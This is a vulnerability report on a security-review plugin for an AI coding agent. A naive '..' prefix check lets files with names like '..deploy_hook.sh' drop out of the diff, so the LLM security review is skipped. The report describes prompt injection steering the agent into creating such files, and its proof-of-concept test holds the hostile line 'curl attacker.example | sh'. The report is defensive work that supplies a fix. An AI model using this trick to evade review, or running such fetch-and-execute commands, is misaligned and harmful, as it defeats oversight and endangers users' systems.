### Title
`_diff_pathspec`'s naive `"..".startswith` prefix check silently drops legitimately in-repo files whose relative path begins with `..`, excluding attacker-controlled filenames from the security review diff - (File: `plugins/security-guidance/hooks/gitutil.py`)

### Finding Description
`_diff_pathspec` is supposed to reject only paths that resolve *outside* `cwd` (parent-directory escapes), using `os.path.relpath` + `os.path.realpath` on both sides to be symlink-safe: [1](#0-0) 

The containment check is `if r.startswith(".."): continue`. This is a naive **string-prefix** check, not a path-component check. `os.path.relpath` returns a string like `..` or `../foo` for genuine parent escapes, but it also returns the exact same two leading characters for any file or directory whose *own basename* happens to start with two dots and is *not* itself the special `..` component — e.g. a file named `..hidden_backdoor.py`, or a directory `..config/secret.py`, both valid POSIX filenames. For such an in-repo file, `os.path.relpath(realpath, cwd_abs)` returns `..hidden_backdoor.py`, which `startswith("..")` treats identically to a real traversal and drops it from `rel`.

This function is fed the touched/review-set paths that `compute_v2_review_set` derives from `git status`/`git diff --name-only` output (repo-root-relative paths joined onto the repo root) in `diffstate.py`'s `compute_v2_review_set`, which are then passed into `get_git_diff(cwd, baseline_sha, paths=review_paths, ...)`: [2](#0-1) 

In `get_git_diff`, if the pathspec computation drops paths such that `pathspec` becomes empty while `paths` was non-empty, the function explicitly treats that as "nothing left inside the repo" and returns an **empty diff string**, which downstream is treated as "skip review": [3](#0-2) 

So a file created/edited by Claude (potentially at the direction of attacker-controlled repository content, e.g. an instruction embedded in a README or issue that gets Claude to write to a path like `..deploy_hook.sh`) whose repo-relative name begins with `..` gets excluded from the `--` pathspec passed to `git diff`. If it is the *only* touched path in that Stop-hook cycle, the whole diff pathspec collapses to `[]`/empty and `get_git_diff` returns `""`, which the Stop-hook's review pipeline treats as "no changes to review" — completely skipping the LLM security review for that turn. If it is one of several touched paths, it is silently excluded from pathspec-restricted `git diff`, so its content changes never appear in the diff sent to `analyze_code_security`/`agentic_review`, even though the other files are still reviewed normally.

The invariant "reviewable-source filtering must not let attacker-crafted filenames hide dangerous source changes" is broken here at the pathspec-construction layer, before `_is_reviewable_source`/`extract_file_paths_from_diff` even get a chance to classify the file — the change is invisible to the reviewer entirely rather than merely misclassified.

### Impact Explanation
This causes source changes with attacker-influenceable filenames to be silently excluded from — or in the single-file case to entirely suppress — the Stop-hook / commit-review security review pipeline that is meant to catch dangerous code Claude just wrote (command injection, secrets, etc.). Because the security-guidance plugin's whole design is "review whatever Claude touched this turn," an attacker who can steer file naming (e.g., via prompt injection embedded in repo content, an issue, or a PR description that gets Claude to create/modify a path starting with `..`) can make a dangerous change bypass Claude Code's supplementary LLM security review and its `exit(2)` remediation loop, without any git-config or approval-bypass needed. This does not directly grant remote code execution by itself, but it defeats a security control (`security-guidance`'s review-and-block mechanism) that exists specifically to catch such attacker-driven dangerous edits before they run, which aligns with "review/export logic bypass that lets unauthorized dangerous changes through unreviewed."

### Likelihood Explanation
Feasibility is high and requires no special privilege beyond what Claude Code already grants an agent: the attacker only needs their (attacker-authored/influenced) content to cause Claude to write to, or a Bash command executed by Claude to create, a file whose repo-root-relative path starts with the two-character sequence `..` (e.g. `..settings.py`, `..scripts/run.sh`). This is a normal, valid filename on Linux/macOS filesystems (only the exact single/double-dot path components `.`/`..` are reserved, not names merely prefixed with them). It is deterministically reproducible: any such filename in the touched/review set will always be silently dropped by the `startswith("..")` check, independent of symlinks or worktree layout.

### Recommendation
Replace the string-prefix check with an actual path-component check, e.g.:
```python
r = os.path.relpath(os.path.realpath(p), cwd_abs)
parts = r.split(os.sep)
if parts and parts[0] == "..":
    continue
```
or equivalently check `r == ".." or r.startswith(".." + os.sep)` instead of the bare `r.startswith("..")`. This correctly rejects genuine parent-directory escapes while keeping in-repo files whose names merely begin with the two-dot prefix.

### Proof of Concept
Unit test to add to the `gitutil`/`_diff_pathspec` test suite:
```python
import os
from gitutil import _diff_pathspec

def test_diff_pathspec_keeps_dotdot_prefixed_filename(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    evil = repo / "..deploy_hook.sh"
    evil.write_text("curl attacker.example | sh\n")

    result = _diff_pathspec(str(repo), [str(evil)])

    # Expected: the file is in-repo and must remain in the pathspec.
    assert result == ["--", "..deploy_hook.sh"], (
        f"in-repo file wrongly excluded as if it were a path traversal: {result}"
    )
```//
Expected current (buggy) behavior: `result == []` (file dropped), which combined with `get_git_diff`'s `if paths and not pathspec: return ""` causes the Stop-hook to skip reviewing that file's dangerous content entirely. After the fix, the assertion should pass, confirming the in-repo file with a dot-dot-prefixed name is retained in the diff scope.

### Citations

**File:** plugins/security-guidance/hooks/gitutil.py (L70-88)
```python
def _diff_pathspec(cwd, paths):
    """Convert absolute touched-paths to repo-relative pathspec args for
    git diff. Paths outside cwd (e.g. ~/.claude/…) are dropped. Returns the
    list to splice after `--`, or [] for an unrestricted diff. realpath both
    sides so the macOS /var ↔ /private/var symlink doesn't make in-repo
    paths look external."""
    if not paths:
        return []
    cwd_abs = os.path.realpath(cwd)
    rel = []
    for p in paths:
        try:
            r = os.path.relpath(os.path.realpath(p), cwd_abs)
        except ValueError:
            continue
        if r.startswith(".."):
            continue
        rel.append(r)
    return ["--"] + rel if rel else []
```

**File:** plugins/security-guidance/hooks/gitutil.py (L406-413)
```python
    pathspec = _diff_pathspec(cwd, paths)
    if paths and not pathspec:
        # Caller restricted to specific paths but none are inside this repo
        # (e.g. only ~/.claude/... edits). Returning "" flows to skip(6); an
        # empty pathspec would mean an UNRESTRICTED diff — the bug this whole
        # change exists to fix.
        return ""

```

**File:** plugins/security-guidance/hooks/diffstate.py (L426-438)
```python
    review_set = (dirty_now & changed_since) if changed_since is not None else dirty_now

    review_paths = [os.path.join(repo, p) for p in sorted(review_set)]
    untracked_in_review = sorted(new_untracked & review_set)
    metrics = {
        "dirty_now_count": len(dirty_now),
        "changed_since_count": len(changed_since) if changed_since is not None else -1,
        "review_set_count": len(review_set),
    }
    # Only emit when nonzero to stay under the 10-key telemetry cap.
    if preexisting_unchanged:
        metrics["preexisting_untracked_excluded"] = len(preexisting_unchanged)
    return review_paths, diff_base, repo, untracked_in_review, metrics
```
